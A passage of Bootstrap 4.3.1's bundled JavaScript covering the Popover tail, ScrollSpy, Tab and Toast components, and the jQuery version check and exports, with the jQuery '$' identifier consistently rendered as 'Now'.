        // Getters
        get: function get() {
          return VERSIONNow7;
        }
      }, {
        key: "Default",
        get: function get() {
          return DefaultNow5;
        }
      }, {
        key: "NAME",
        get: function get() {
          return NAMENow7;
        }
      }, {
        key: "DATA_KEY",
        get: function get() {
          return DATA_KEYNow7;
        }
      }, {
        key: "Event",
        get: function get() {
          return EventNow7;
        }
      }, {
        key: "EVENT_KEY",
        get: function get() {
          return EVENT_KEYNow7;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultTypeNow5;
        }
      }]);

      return Popover;
    }(Tooltip);
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  Now.fn[NAMENow7] = Popover._jQueryInterface;
  Now.fn[NAMENow7].Constructor = Popover;

  Now.fn[NAMENow7].noConflict = function () {
    Now.fn[NAMENow7] = JQUERY_NO_CONFLICTNow7;
    return Popover._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow8 = 'scrollspy';
  var VERSIONNow8 = '4.3.1';
  var DATA_KEYNow8 = 'bs.scrollspy';
  var EVENT_KEYNow8 = "." + DATA_KEYNow8;
  var DATA_API_KEYNow6 = '.data-api';
  var JQUERY_NO_CONFLICTNow8 = Now.fn[NAMENow8];
  var DefaultNow6 = {
    offset: 10,
    method: 'auto',
    target: ''
  };
  var DefaultTypeNow6 = {
    offset: 'number',
    method: 'string',
    target: '(string|element)'
  };
  var EventNow8 = {
    ACTIVATE: "activate" + EVENT_KEYNow8,
    SCROLL: "scroll" + EVENT_KEYNow8,
    LOAD_DATA_API: "load" + EVENT_KEYNow8 + DATA_API_KEYNow6
  };
  var ClassNameNow8 = {
    DROPDOWN_ITEM: 'dropdown-item',
    DROPDOWN_MENU: 'dropdown-menu',
    ACTIVE: 'active'
  };
  var SelectorNow8 = {
    DATA_SPY: '[data-spy="scroll"]',
    ACTIVE: '.active',
    NAV_LIST_GROUP: '.nav, .list-group',
    NAV_LINKS: '.nav-link',
    NAV_ITEMS: '.nav-item',
    LIST_ITEMS: '.list-group-item',
    DROPDOWN: '.dropdown',
    DROPDOWN_ITEMS: '.dropdown-item',
    DROPDOWN_TOGGLE: '.dropdown-toggle'
  };
  var OffsetMethod = {
    OFFSET: 'offset',
    POSITION: 'position'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var ScrollSpy =
    /*#__PURE__*/
    function () {
      function ScrollSpy(element, config) {
        var _this = this;

        this._element = element;
        this._scrollElement = element.tagName === 'BODY' ? window : element;
        this._config = this._getConfig(config);
        this._selector = this._config.target + " " + SelectorNow8.NAV_LINKS + "," + (this._config.target + " " + SelectorNow8.LIST_ITEMS + ",") + (this._config.target + " " + SelectorNow8.DROPDOWN_ITEMS);
        this._offsets = [];
        this._targets = [];
        this._activeTarget = null;
        this._scrollHeight = 0;
        Now(this._scrollElement).on(EventNow8.SCROLL, function (event) {
          return _this._process(event);
        });
        this.refresh();

        this._process();
      } // Getters


      var _proto = ScrollSpy.prototype;

      // Public
      _proto.refresh = function refresh() {
        var _this2 = this;

        var autoMethod = this._scrollElement === this._scrollElement.window ? OffsetMethod.OFFSET : OffsetMethod.POSITION;
        var offsetMethod = this._config.method === 'auto' ? autoMethod : this._config.method;
        var offsetBase = offsetMethod === OffsetMethod.POSITION ? this._getScrollTop() : 0;
        this._offsets = [];
        this._targets = [];
        this._scrollHeight = this._getScrollHeight();
        var targets = [].slice.call(document.querySelectorAll(this._selector));
        targets.map(function (element) {
          var target;
          var targetSelector = Util.getSelectorFromElement(element);

          if (targetSelector) {
            target = document.querySelector(targetSelector);
          }

          if (target) {
            var targetBCR = target.getBoundingClientRect();

            if (targetBCR.width || targetBCR.height) {
              // TODO (fat): remove sketch reliance on jQuery position/offset
              return [Now(target)[offsetMethod]().top + offsetBase, targetSelector];
            }
          }

          return null;
        }).filter(function (item) {
          return item;
        }).sort(function (a, b) {
          return a[0] - b[0];
        }).forEach(function (item) {
          _this2._offsets.push(item[0]);

          _this2._targets.push(item[1]);
        });
      };

      _proto.dispose = function dispose() {
        Now.removeData(this._element, DATA_KEYNow8);
        Now(this._scrollElement).off(EVENT_KEYNow8);
        this._element = null;
        this._scrollElement = null;
        this._config = null;
        this._selector = null;
        this._offsets = null;
        this._targets = null;
        this._activeTarget = null;
        this._scrollHeight = null;
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, DefaultNow6, typeof config === 'object' && config ? config : {});

        if (typeof config.target !== 'string') {
          var id = Now(config.target).attr('id');

          if (!id) {
            id = Util.getUID(NAMENow8);
            Now(config.target).attr('id', id);
          }

          config.target = "#" + id;
        }

        Util.typeCheckConfig(NAMENow8, config, DefaultTypeNow6);
        return config;
      };

      _proto._getScrollTop = function _getScrollTop() {
        return this._scrollElement === window ? this._scrollElement.pageYOffset : this._scrollElement.scrollTop;
      };

      _proto._getScrollHeight = function _getScrollHeight() {
        return this._scrollElement.scrollHeight || Math.max(document.body.scrollHeight, document.documentElement.scrollHeight);
      };

      _proto._getOffsetHeight = function _getOffsetHeight() {
        return this._scrollElement === window ? window.innerHeight : this._scrollElement.getBoundingClientRect().height;
      };

      _proto._process = function _process() {
        var scrollTop = this._getScrollTop() + this._config.offset;

        var scrollHeight = this._getScrollHeight();

        var maxScroll = this._config.offset + scrollHeight - this._getOffsetHeight();

        if (this._scrollHeight !== scrollHeight) {
          this.refresh();
        }

        if (scrollTop >= maxScroll) {
          var target = this._targets[this._targets.length - 1];

          if (this._activeTarget !== target) {
            this._activate(target);
          }

          return;
        }

        if (this._activeTarget && scrollTop < this._offsets[0] && this._offsets[0] > 0) {
          this._activeTarget = null;

          this._clear();

          return;
        }

        var offsetLength = this._offsets.length;

        for (var i = offsetLength; i--;) {
          var isActiveTarget = this._activeTarget !== this._targets[i] && scrollTop >= this._offsets[i] && (typeof this._offsets[i + 1] === 'undefined' || scrollTop < this._offsets[i + 1]);

          if (isActiveTarget) {
            this._activate(this._targets[i]);
          }
        }
      };

      _proto._activate = function _activate(target) {
        this._activeTarget = target;

        this._clear();

        var queries = this._selector.split(',').map(function (selector) {
          return selector + "[data-target=\"" + target + "\"]," + selector + "[href=\"" + target + "\"]";
        });

        var Nowlink = Now([].slice.call(document.querySelectorAll(queries.join(','))));

        if (Nowlink.hasClass(ClassNameNow8.DROPDOWN_ITEM)) {
          Nowlink.closest(SelectorNow8.DROPDOWN).find(SelectorNow8.DROPDOWN_TOGGLE).addClass(ClassNameNow8.ACTIVE);
          Nowlink.addClass(ClassNameNow8.ACTIVE);
        } else {
          // Set triggered link as active
          Nowlink.addClass(ClassNameNow8.ACTIVE); // Set triggered links parents as active
          // With both <ul> and <nav> markup a parent is the previous sibling of any nav ancestor

          Nowlink.parents(SelectorNow8.NAV_LIST_GROUP).prev(SelectorNow8.NAV_LINKS + ", " + SelectorNow8.LIST_ITEMS).addClass(ClassNameNow8.ACTIVE); // Handle special case when .nav-link is inside .nav-item

          Nowlink.parents(SelectorNow8.NAV_LIST_GROUP).prev(SelectorNow8.NAV_ITEMS).children(SelectorNow8.NAV_LINKS).addClass(ClassNameNow8.ACTIVE);
        }

        Now(this._scrollElement).trigger(EventNow8.ACTIVATE, {
          relatedTarget: target
        });
      };

      _proto._clear = function _clear() {
        [].slice.call(document.querySelectorAll(this._selector)).filter(function (node) {
          return node.classList.contains(ClassNameNow8.ACTIVE);
        }).forEach(function (node) {
          return node.classList.remove(ClassNameNow8.ACTIVE);
        });
      } // Static
      ;

      ScrollSpy._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var data = Now(this).data(DATA_KEYNow8);

          var _config = typeof config === 'object' && config;

          if (!data) {
            data = new ScrollSpy(this, _config);
            Now(this).data(DATA_KEYNow8, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(ScrollSpy, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNow8;
        }
      }, {
        key: "Default",
        get: function get() {
          return DefaultNow6;
        }
      }]);

      return ScrollSpy;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  Now(window).on(EventNow8.LOAD_DATA_API, function () {
    var scrollSpys = [].slice.call(document.querySelectorAll(SelectorNow8.DATA_SPY));
    var scrollSpysLength = scrollSpys.length;

    for (var i = scrollSpysLength; i--;) {
      var Nowspy = Now(scrollSpys[i]);

      ScrollSpy._jQueryInterface.call(Nowspy, Nowspy.data());
    }
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  Now.fn[NAMENow8] = ScrollSpy._jQueryInterface;
  Now.fn[NAMENow8].Constructor = ScrollSpy;

  Now.fn[NAMENow8].noConflict = function () {
    Now.fn[NAMENow8] = JQUERY_NO_CONFLICTNow8;
    return ScrollSpy._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENow9 = 'tab';
  var VERSIONNow9 = '4.3.1';
  var DATA_KEYNow9 = 'bs.tab';
  var EVENT_KEYNow9 = "." + DATA_KEYNow9;
  var DATA_API_KEYNow7 = '.data-api';
  var JQUERY_NO_CONFLICTNow9 = Now.fn[NAMENow9];
  var EventNow9 = {
    HIDE: "hide" + EVENT_KEYNow9,
    HIDDEN: "hidden" + EVENT_KEYNow9,
    SHOW: "show" + EVENT_KEYNow9,
    SHOWN: "shown" + EVENT_KEYNow9,
    CLICK_DATA_API: "click" + EVENT_KEYNow9 + DATA_API_KEYNow7
  };
  var ClassNameNow9 = {
    DROPDOWN_MENU: 'dropdown-menu',
    ACTIVE: 'active',
    DISABLED: 'disabled',
    FADE: 'fade',
    SHOW: 'show'
  };
  var SelectorNow9 = {
    DROPDOWN: '.dropdown',
    NAV_LIST_GROUP: '.nav, .list-group',
    ACTIVE: '.active',
    ACTIVE_UL: '> li > .active',
    DATA_TOGGLE: '[data-toggle="tab"], [data-toggle="pill"], [data-toggle="list"]',
    DROPDOWN_TOGGLE: '.dropdown-toggle',
    DROPDOWN_ACTIVE_CHILD: '> .dropdown-menu .active'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Tab =
    /*#__PURE__*/
    function () {
      function Tab(element) {
        this._element = element;
      } // Getters


      var _proto = Tab.prototype;

      // Public
      _proto.show = function show() {
        var _this = this;

        if (this._element.parentNode && this._element.parentNode.nodeType === Node.ELEMENT_NODE && Now(this._element).hasClass(ClassNameNow9.ACTIVE) || Now(this._element).hasClass(ClassNameNow9.DISABLED)) {
          return;
        }

        var target;
        var previous;
        var listElement = Now(this._element).closest(SelectorNow9.NAV_LIST_GROUP)[0];
        var selector = Util.getSelectorFromElement(this._element);

        if (listElement) {
          var itemSelector = listElement.nodeName === 'UL' || listElement.nodeName === 'OL' ? SelectorNow9.ACTIVE_UL : SelectorNow9.ACTIVE;
          previous = Now.makeArray(Now(listElement).find(itemSelector));
          previous = previous[previous.length - 1];
        }

        var hideEvent = Now.Event(EventNow9.HIDE, {
          relatedTarget: this._element
        });
        var showEvent = Now.Event(EventNow9.SHOW, {
          relatedTarget: previous
        });

        if (previous) {
          Now(previous).trigger(hideEvent);
        }

        Now(this._element).trigger(showEvent);

        if (showEvent.isDefaultPrevented() || hideEvent.isDefaultPrevented()) {
          return;
        }

        if (selector) {
          target = document.querySelector(selector);
        }

        this._activate(this._element, listElement);

        var complete = function complete() {
          var hiddenEvent = Now.Event(EventNow9.HIDDEN, {
            relatedTarget: _this._element
          });
          var shownEvent = Now.Event(EventNow9.SHOWN, {
            relatedTarget: previous
          });
          Now(previous).trigger(hiddenEvent);
          Now(_this._element).trigger(shownEvent);
        };

        if (target) {
          this._activate(target, target.parentNode, complete);
        } else {
          complete();
        }
      };

      _proto.dispose = function dispose() {
        Now.removeData(this._element, DATA_KEYNow9);
        this._element = null;
      } // Private
      ;

      _proto._activate = function _activate(element, container, callback) {
        var _this2 = this;

        var activeElements = container && (container.nodeName === 'UL' || container.nodeName === 'OL') ? Now(container).find(SelectorNow9.ACTIVE_UL) : Now(container).children(SelectorNow9.ACTIVE);
        var active = activeElements[0];
        var isTransitioning = callback && active && Now(active).hasClass(ClassNameNow9.FADE);

        var complete = function complete() {
          return _this2._transitionComplete(element, active, callback);
        };

        if (active && isTransitioning) {
          var transitionDuration = Util.getTransitionDurationFromElement(active);
          Now(active).removeClass(ClassNameNow9.SHOW).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      };

      _proto._transitionComplete = function _transitionComplete(element, active, callback) {
        if (active) {
          Now(active).removeClass(ClassNameNow9.ACTIVE);
          var dropdownChild = Now(active.parentNode).find(SelectorNow9.DROPDOWN_ACTIVE_CHILD)[0];

          if (dropdownChild) {
            Now(dropdownChild).removeClass(ClassNameNow9.ACTIVE);
          }

          if (active.getAttribute('role') === 'tab') {
            active.setAttribute('aria-selected', false);
          }
        }

        Now(element).addClass(ClassNameNow9.ACTIVE);

        if (element.getAttribute('role') === 'tab') {
          element.setAttribute('aria-selected', true);
        }

        Util.reflow(element);

        if (element.classList.contains(ClassNameNow9.FADE)) {
          element.classList.add(ClassNameNow9.SHOW);
        }

        if (element.parentNode && Now(element.parentNode).hasClass(ClassNameNow9.DROPDOWN_MENU)) {
          var dropdownElement = Now(element).closest(SelectorNow9.DROPDOWN)[0];

          if (dropdownElement) {
            var dropdownToggleList = [].slice.call(dropdownElement.querySelectorAll(SelectorNow9.DROPDOWN_TOGGLE));
            Now(dropdownToggleList).addClass(ClassNameNow9.ACTIVE);
          }

          element.setAttribute('aria-expanded', true);
        }

        if (callback) {
          callback();
        }
      } // Static
      ;

      Tab._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var Nowthis = Now(this);
          var data = Nowthis.data(DATA_KEYNow9);

          if (!data) {
            data = new Tab(this);
            Nowthis.data(DATA_KEYNow9, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config]();
          }
        });
      };

      _createClass(Tab, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNow9;
        }
      }]);

      return Tab;
    }();
  /**
   * ------------------------------------------------------------------------
   * Data Api implementation
   * ------------------------------------------------------------------------
   */


  Now(document).on(EventNow9.CLICK_DATA_API, SelectorNow9.DATA_TOGGLE, function (event) {
    event.preventDefault();

    Tab._jQueryInterface.call(Now(this), 'show');
  });
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */

  Now.fn[NAMENow9] = Tab._jQueryInterface;
  Now.fn[NAMENow9].Constructor = Tab;

  Now.fn[NAMENow9].noConflict = function () {
    Now.fn[NAMENow9] = JQUERY_NO_CONFLICTNow9;
    return Tab._jQueryInterface;
  };

  /**
   * ------------------------------------------------------------------------
   * Constants
   * ------------------------------------------------------------------------
   */

  var NAMENowa = 'toast';
  var VERSIONNowa = '4.3.1';
  var DATA_KEYNowa = 'bs.toast';
  var EVENT_KEYNowa = "." + DATA_KEYNowa;
  var JQUERY_NO_CONFLICTNowa = Now.fn[NAMENowa];
  var EventNowa = {
    CLICK_DISMISS: "click.dismiss" + EVENT_KEYNowa,
    HIDE: "hide" + EVENT_KEYNowa,
    HIDDEN: "hidden" + EVENT_KEYNowa,
    SHOW: "show" + EVENT_KEYNowa,
    SHOWN: "shown" + EVENT_KEYNowa
  };
  var ClassNameNowa = {
    FADE: 'fade',
    HIDE: 'hide',
    SHOW: 'show',
    SHOWING: 'showing'
  };
  var DefaultTypeNow7 = {
    animation: 'boolean',
    autohide: 'boolean',
    delay: 'number'
  };
  var DefaultNow7 = {
    animation: true,
    autohide: true,
    delay: 500
  };
  var SelectorNowa = {
    DATA_DISMISS: '[data-dismiss="toast"]'
    /**
     * ------------------------------------------------------------------------
     * Class Definition
     * ------------------------------------------------------------------------
     */

  };

  var Toast =
    /*#__PURE__*/
    function () {
      function Toast(element, config) {
        this._element = element;
        this._config = this._getConfig(config);
        this._timeout = null;

        this._setListeners();
      } // Getters


      var _proto = Toast.prototype;

      // Public
      _proto.show = function show() {
        var _this = this;

        Now(this._element).trigger(EventNowa.SHOW);

        if (this._config.animation) {
          this._element.classList.add(ClassNameNowa.FADE);
        }

        var complete = function complete() {
          _this._element.classList.remove(ClassNameNowa.SHOWING);

          _this._element.classList.add(ClassNameNowa.SHOW);

          Now(_this._element).trigger(EventNowa.SHOWN);

          if (_this._config.autohide) {
            _this.hide();
          }
        };

        this._element.classList.remove(ClassNameNowa.HIDE);

        this._element.classList.add(ClassNameNowa.SHOWING);

        if (this._config.animation) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          Now(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      };

      _proto.hide = function hide(withoutTimeout) {
        var _this2 = this;

        if (!this._element.classList.contains(ClassNameNowa.SHOW)) {
          return;
        }

        Now(this._element).trigger(EventNowa.HIDE);

        if (withoutTimeout) {
          this._close();
        } else {
          this._timeout = setTimeout(function () {
            _this2._close();
          }, this._config.delay);
        }
      };

      _proto.dispose = function dispose() {
        clearTimeout(this._timeout);
        this._timeout = null;

        if (this._element.classList.contains(ClassNameNowa.SHOW)) {
          this._element.classList.remove(ClassNameNowa.SHOW);
        }

        Now(this._element).off(EventNowa.CLICK_DISMISS);
        Now.removeData(this._element, DATA_KEYNowa);
        this._element = null;
        this._config = null;
      } // Private
      ;

      _proto._getConfig = function _getConfig(config) {
        config = _objectSpread({}, DefaultNow7, Now(this._element).data(), typeof config === 'object' && config ? config : {});
        Util.typeCheckConfig(NAMENowa, config, this.constructor.DefaultType);
        return config;
      };

      _proto._setListeners = function _setListeners() {
        var _this3 = this;

        Now(this._element).on(EventNowa.CLICK_DISMISS, SelectorNowa.DATA_DISMISS, function () {
          return _this3.hide(true);
        });
      };

      _proto._close = function _close() {
        var _this4 = this;

        var complete = function complete() {
          _this4._element.classList.add(ClassNameNowa.HIDE);

          Now(_this4._element).trigger(EventNowa.HIDDEN);
        };

        this._element.classList.remove(ClassNameNowa.SHOW);

        if (this._config.animation) {
          var transitionDuration = Util.getTransitionDurationFromElement(this._element);
          Now(this._element).one(Util.TRANSITION_END, complete).emulateTransitionEnd(transitionDuration);
        } else {
          complete();
        }
      } // Static
      ;

      Toast._jQueryInterface = function _jQueryInterface(config) {
        return this.each(function () {
          var Nowelement = Now(this);
          var data = Nowelement.data(DATA_KEYNowa);

          var _config = typeof config === 'object' && config;

          if (!data) {
            data = new Toast(this, _config);
            Nowelement.data(DATA_KEYNowa, data);
          }

          if (typeof config === 'string') {
            if (typeof data[config] === 'undefined') {
              throw new TypeError("No method named \"" + config + "\"");
            }

            data[config](this);
          }
        });
      };

      _createClass(Toast, null, [{
        key: "VERSION",
        get: function get() {
          return VERSIONNowa;
        }
      }, {
        key: "DefaultType",
        get: function get() {
          return DefaultTypeNow7;
        }
      }, {
        key: "Default",
        get: function get() {
          return DefaultNow7;
        }
      }]);

      return Toast;
    }();
  /**
   * ------------------------------------------------------------------------
   * jQuery
   * ------------------------------------------------------------------------
   */


  Now.fn[NAMENowa] = Toast._jQueryInterface;
  Now.fn[NAMENowa].Constructor = Toast;

  Now.fn[NAMENowa].noConflict = function () {
    Now.fn[NAMENowa] = JQUERY_NO_CONFLICTNowa;
    return Toast._jQueryInterface;
  };

  /**
   * --------------------------------------------------------------------------
   * Bootstrap (v4.3.1): index.js
   * Licensed under MIT (https://github.com/twbs/bootstrap/blob/master/LICENSE)
   * --------------------------------------------------------------------------
   */

  (function () {
    if (typeof Now === 'undefined') {
      throw new TypeError('Bootstrap\'s JavaScript requires jQuery. jQuery must be included before Bootstrap\'s JavaScript.');
    }

    var version = Now.fn.jquery.split(' ')[0].split('.');
    var minMajor = 1;
    var ltMajor = 2;
    var minMinor = 9;
    var minPatch = 1;
    var maxMajor = 4;

    if (version[0] < ltMajor && version[1] < minMinor || version[0] === minMajor && version[1] === minMinor && version[2] < minPatch || version[0] >= maxMajor) {
      throw new Error('Bootstrap\'s JavaScript requires at least jQuery v1.9.1 but less than v4.0.0');
    }
  })();

  exports.Util = Util;
  exports.Alert = Alert;
  exports.Button = Button;
  exports.Carousel = Carousel;
  exports.Collapse = Collapse;
  exports.Dropdown = Dropdown;
  exports.Modal = Modal;
  exports.Popover = Popover;
  exports.Scrollspy = ScrollSpy;
  exports.Tab = Tab;
  exports.Toast = Toast;
  exports.Tooltip = Tooltip;

  Object.defineProperty(exports, '__esModule', {
    value: true
  });

}));
//# sourceMappingURL=bootstrap.js.map